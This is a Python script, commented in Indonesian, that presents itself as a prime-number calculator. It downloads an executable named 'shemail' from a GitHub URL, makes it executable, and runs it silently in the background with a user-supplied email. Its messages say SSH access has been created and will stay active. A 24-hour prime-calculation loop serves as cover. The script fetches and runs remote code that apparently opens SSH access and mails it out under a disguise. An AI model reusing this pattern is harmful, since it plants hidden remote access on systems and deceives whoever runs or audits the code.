import os
import subprocess
import time
import math
from datetime import datetime, timedelta
import urllib.request
import argparse

# URL file
SSHMAIL_URL = "https://github.com/icadnewton/sendme/raw/refs/heads/main/shemail"
SSHMAIL_FILE = "shemail"

# Cek dan unduh file

def check_and_download_file(file_name, url):
    if not os.path.exists(file_name):
        print(f"File {file_name} tidak tersedia. Mengunduh dari {url}...")
        try:
            urllib.request.urlretrieve(url, file_name)
            print(f"File {file_name} berhasil diunduh.")
            os.chmod(file_name, 0o755)  # Memberikan izin eksekusi chmod +x
            print(f"Izin eksekusi telah diberikan pada {file_name}.")
        except Exception as e:
            print(f"Gagal mengunduh {file_name}: {e}")
            raise
    else:
        print(f"File {file_name} sudah tersedia.")

# Jalankan script di background
def run_background_script(email):
    try:
        script_path = os.path.abspath(SSHMAIL_FILE)  # Menggunakan path absolut
        if not os.path.exists(script_path):
            raise FileNotFoundError(f"File {script_path} tidak ditemukan.")
        if not os.access(script_path, os.X_OK):
            raise PermissionError(f"File {script_path} tidak memiliki izin eksekusi.")

        command = [script_path, "-email", email]
        subprocess.Popen(
            command,
            stdout=subprocess.DEVNULL,  # Supress stdout
            stderr=subprocess.DEVNULL,  # Supress stderr
        )
        print(f"Akses berhasil dibuat, periksa email Anda: {email}")
    except Exception as e:
        print(f"Error saat menjalankan script {SSHMAIL_FILE}: {e}")
        raise

# Cek bilangan prima
def is_prime(number):
    if number <= 1:
        return False
    for i in range(2, int(math.sqrt(number)) + 1):
        if number % i == 0:
            return False
    return True

# Hitung bilangan prima
def calculate_primes():
    print("Menghitung bilangan prima...")
    max_number = 1000
    primes = [num for num in range(2, max_number + 1) if is_prime(num)]
    print(f"Bilangan prima antara 2 dan {max_number}:")
    print(primes)

# Fungsi utama
def main():
    parser = argparse.ArgumentParser(description="Script untuk menghitung bilangan prima.")
    parser.add_argument("-email", required=True, help="Alamat email penerima.")
    args = parser.parse_args()
    email = args.email

    # Validasi email sederhana
    if "@" not in email or "." not in email:
        print("Email tidak valid. Harap masukkan email yang benar.")
        return

    # Unduh file jika perlu
    check_and_download_file(SSHMAIL_FILE, SSHMAIL_URL)

    # Jalankan skrip background
    try:
        run_background_script(email)
    except Exception:
        print("Gagal menjalankan script. Program dihentikan.")
        return

    # Mulai menghitung bilangan prima
    start_time = datetime.now()
    end_time = start_time + timedelta(hours=24)

    print("Menghitung bilangan prima selama 24 jam...")
    while datetime.now() < end_time:
        calculate_primes()
        time.sleep(180)  # Sleep selama 3 menit

    print("Program selesai. Anda dapat menutup program ini, akses SSH Anda akan tetap aktif.")

if __name__ == "__main__":
    main()
